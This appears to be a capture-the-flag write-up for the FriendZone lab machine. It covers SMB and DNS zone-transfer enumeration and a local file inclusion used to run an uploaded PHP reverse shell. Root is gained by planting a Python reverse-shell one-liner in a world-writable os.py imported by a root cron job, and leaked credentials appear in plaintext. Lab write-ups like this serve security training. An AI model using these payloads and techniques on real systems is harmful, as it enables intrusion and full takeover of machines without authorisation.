# recon
pymap.py
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a9:68:24:bc:97:1f:1e:54:a5:80:45:e7:4c:d9:aa:a0 (RSA)
|   256 e5:44:01:46:ee:7a:bb:7c:e9:1a:cb:14:99:9e:2b:8e (ECDSA)
|_  256 00:4e:1a:4f:33:e8:a0:de:86:a6:e4:2a:5f:84:61:2b (ED25519)


PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3


PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Friend Zone Escape software


PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE

Host script results:
|_clock-skew: mean: -37m12s, deviation: 1h09m16s, median: 2m47s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-11-12T18:03:57+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-12T16:03:57
|_  start_date: N/A


PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
Service Info: Host: FRIENDZONE

Host script results:
|_clock-skew: mean: -37m12s, deviation: 1h09m16s, median: 2m47s
|_nbstat: NetBIOS name: FRIENDZONE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)
|   Computer name: friendzone
|   NetBIOS computer name: FRIENDZONE\x00
|   Domain name: \x00
|   FQDN: friendzone
|_  System time: 2020-11-12T18:04:02+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-11-12T16:04:02
|_  start_date: N/A


PORT   STATE SERVICE VERSION
53/tcp open  domain  ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.11.3-1ubuntu1.2-Ubuntu


PORT    STATE SERVICE VERSION
443/tcp open  ssl/ssl Apache httpd (SSL-only mode)
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 404 Not Found
| ssl-cert: Subject: commonName=friendzone.red/organizationName=CODERED/stateOrProvinceName=CODERED/countryName=JO
| Not valid before: 2018-10-05T21:02:30
|_Not valid after:  2018-11-04T21:02:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
```
open port:
- ssh
- ftp vsftpd 3.0.3 : no Anonymouse login
- smb
```
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.10.123\Development: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\Development
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\Files: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files /etc/Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\hole
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.10.123\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: IPC Service (FriendZone server (Samba, Ubuntu))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\general: 
|     Type: STYPE_DISKTREE
|     Comment: FriendZone Samba Server Files
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\etc\general
|     Anonymous access: READ/WRITE
|     Current user access: READ/WRITE
|   \\10.10.10.123\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 0
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|_    Current user access: <none>
|_smb-enum-users: ERROR: Script execution failed (use -d to debug)
```
- 80 Apache httpd 2.4.29
```
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/robots.txt (Status: 200)
/server-status (Status: 403)
/wordpress (Status: 301)
```

- 443 Apache httpd (SSL-only mode): nothing there, 404
## enum smb
3 shares:
- /File. cant not login Anonym
- /Development: empty
- /general: cred.txt
```console
$ cat creds.txt                                                                            1 ⨯
creds for the admin THING:

admin:WORKWORKHhallelujah@#
```
let try to connect to share again with `admin` cred

## enumerate web
web visite http `/index.html` there is am email `info@friendzoneportal.red`. So I guess that the server might run a vhost call `friendzoneportal.red`. Moreover, from nmap scan port 443 `ssl-cert: Subject: commonName=friendzone.red/` it is using `.red` so it is possible that `friendzoneportal.red` is hostname for http/https. Add the hostname in `/etc/hosts` and try to visit the web again.. Bingo! now we can access https port 443.


I try to run gobuster again, but it seem like the site is blocking us after few tries. like it said in title page `Watching you!`... I was hitting the wall for a while and I then I was like, let just add `friendzone.red` in hostname too then! Since it is shown in the cert anyway. now vishit http://friendzone.red and check src code!! 
```html
<!-- Just doing some development here -->
<!-- /js/js -->
<!-- Don't go deep ;) -->
```
/js/js
```html
<!-- dont stare too much , you will be smashed ! , it's all about times and zones ! -->
```
Rabbit hole is deep, the weird string is was nothing to look at. When I see this message I was thinking about DNS Zone. Read more about DNS zone tranfer AXFR [here](https://www.acunetix.com/blog/articles/dns-zone-transfers-axfr/). And this make sense too since port 53 is oppen. now run `dig`
```console
└─$ dig axfr friendzone.red @10.10.10.123

; <<>> DiG 9.16.6-Debian <<>> axfr friendzone.red @10.10.10.123
;; global options: +cmd
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzone.red.		604800	IN	AAAA	::1
friendzone.red.		604800	IN	NS	localhost.
friendzone.red.		604800	IN	A	127.0.0.1
administrator1.friendzone.red. 604800 IN A	127.0.0.1
hr.friendzone.red.	604800	IN	A	127.0.0.1
uploads.friendzone.red.	604800	IN	A	127.0.0.1
friendzone.red.		604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 44 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Nov 12 12:15:55 EST 2020
;; XFR size: 8 records (messages 1, bytes 289)
$ dig axfr friendzoneportal.red @10.10.10.123 

; <<>> DiG 9.16.6-Debian <<>> axfr friendzoneportal.red @10.10.10.123
;; global options: +cmd
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
friendzoneportal.red.	604800	IN	AAAA	::1
friendzoneportal.red.	604800	IN	NS	localhost.
friendzoneportal.red.	604800	IN	A	127.0.0.1
admin.friendzoneportal.red. 604800 IN	A	127.0.0.1
files.friendzoneportal.red. 604800 IN	A	127.0.0.1
imports.friendzoneportal.red. 604800 IN	A	127.0.0.1
vpn.friendzoneportal.red. 604800 IN	A	127.0.0.1
friendzoneportal.red.	604800	IN	SOA	localhost. root.localhost. 2 604800 86400 2419200 604800
;; Query time: 36 msec
;; SERVER: 10.10.10.123#53(10.10.10.123)
;; WHEN: Thu Nov 12 12:33:18 EST 2020
;; XFR size: 9 records (messages 1, bytes 309)

```

# foothold
lets add this hostnames to our /etc/hosts
- administrator1.friendzone.red
- hr.friendzone.red
- uploads.friendzone.red
- imports.friendzoneportal.red 404
- admin.friendzoneportal.red not dev yet
- files.friendzoneportal.red 404
- vpn.friendzoneportal.red 404

after log into `administrator1.friendzone.red`, I noticed that we can request for picture by runing `/dashboard.php??image_id=a.jpg&pagename=timestamp`. and it works. `uploads.friendzone.red` allow us to upload file! but I cannot get my file from `dashboard.php`..

I this https://www.idontplaydarts.com/2011/02/using-php-filter-for-local-file-inclusion/ requesting for login page `?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=login` and it works. but I dont know why I can request for `../../../../../etc/passwd`. I assume that it only allow us to get .php file.


Back when we enum smb using nmap script. Note that We have write permission to it. The plan if we upload a php revershell and use LFI to execute it.
```console
└─$ smbclient //friendzone.red/Development                                                 130 ⨯
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> put cutiecat.php 
putting file cutiecat.php as \cutiecat.php (26.8 kb/s) (average 26.8 kb/s)
```
now vist `?image_id=a.jpg&pagename=php://filter/convert.base64-encode/resource=/etc/Development/cutiecat`, it return our reverse shell src code. Let request for `?image_id=a.jpg&pagename=php:/etc/Development/cutiecat` for RCE!!
```console
└─$ nc -nlvp 6969                                      
listening on [any] 6969 ...
connect to [10.10.14.43] from (UNKNOWN) [10.10.10.123] 50986
Linux FriendZone 4.15.0-36-generic #39-Ubuntu SMP Mon Sep 24 16:19:09 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
 20:02:26 up  2:40,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
# user
```console
$ python3 -c "import pty; pty.spawn('/bin/bash')"
www-data@FriendZone:/$ ^Z
zsh: suspended  nc -nlvp 6969
                                                                                                             
┌──(kali㉿kali)-[~]
└─$ stty raw -echo;fg                                                                              148 ⨯ 1 ⚙
[1]  + continued  nc -nlvp 6969
                               export TERM=xterm
www-data@FriendZone:/$ ls
bin   home	      lib64	  opt	sbin	  tmp	   vmlinuz.old
boot  initrd.img      lost+found  proc	srv	  usr
dev   initrd.img.old  media	  root	swapfile  var
etc   lib	      mnt	  run	sys	  vmlinuz
www-data@FriendZone:/$ ls /home
friend
www-data@FriendZone:/$ ls -la /home/friend/
total 36
drwxr-xr-x 5 friend friend 4096 Jan 24  2019 .
drwxr-xr-x 3 root   root   4096 Oct  5  2018 ..
lrwxrwxrwx 1 root   root      9 Jan 24  2019 .bash_history -> /dev/null
-rw-r--r-- 1 friend friend  220 Oct  5  2018 .bash_logout
-rw-r--r-- 1 friend friend 3771 Oct  5  2018 .bashrc
drwx------ 2 friend friend 4096 Oct  5  2018 .cache
drwx------ 3 friend friend 4096 Oct  6  2018 .gnupg
drwxrwxr-x 3 friend friend 4096 Oct  6  2018 .local
-rw-r--r-- 1 friend friend  807 Oct  5  2018 .profile
-rw-r--r-- 1 friend friend    0 Oct  5  2018 .sudo_as_admin_successful
-r--r--r-- 1 root   root     33 Oct  6  2018 user.txt
www-data@FriendZone:/$ cat /home/friend/user.txt 
```
let's check web dir.
```
www-data@FriendZone:/var/www$ ls
admin	    friendzoneportal	   html		    uploads
friendzone  friendzoneportaladmin  mysql_data.conf
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
```
same username as /home/friend, shall we try to ssh?
```console
└─$ ssh friend@friendzone.red        
friend@friendzone.red's password: 
Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

You have mail.
Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3
friend@FriendZone:~$ id
uid=1000(friend) gid=1000(friend) groups=1000(friend),4(adm),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```
This user are in so many group...
```
friend@FriendZone:~$ sudo -l
[sudo] password for friend: 
Sorry, user friend may not run sudo on FriendZone.
```
nope didnt work

# root.
- linpeas.sh
```
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
.
.
/usr/lib/python2.7
/usr/lib/python2.7/os.py
/usr/lib/python2.7/os.pyc
.
```
- pspy
```
2020/11/12 21:16:01 CMD: UID=0    PID=17544  | /usr/bin/python /opt/server_admin/reporter.py 
2020/11/12 21:16:01 CMD: UID=0    PID=17543  | /bin/sh -c /opt/server_admin/reporter.py 
2020/11/12 21:16:01 CMD: UID=0    PID=17542  | /usr/sbin/CRON -f 
```

let check `/opt/server_admin/reporter.py`
```python
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```
the script is calling `/usr/lib/python2.7/os.py` since it is using `import os`. Lucky for us we have write permission to `os.py`. The goal is adding a python reverse shell inside `os.py`. Our payload will be execute when root crontab is executing `/opt/server_admin/reporter.py `


here is the payload
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.43",6969));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);
```
on kali
```console
kali@kali:~$ nc -nvlp 6969
listening on [any] 6969 ...

connect to [10.10.14.43] from (UNKNOWN) [10.10.10.123] 53932
bash: cannot set terminal process group (17829): Inappropriate ioctl for device
bash: no job control in this shell
root@FriendZone:~# 
root@FriendZone:~# ls
ls
certs
root.txt
root@FriendZone:~# cat root.txt	
```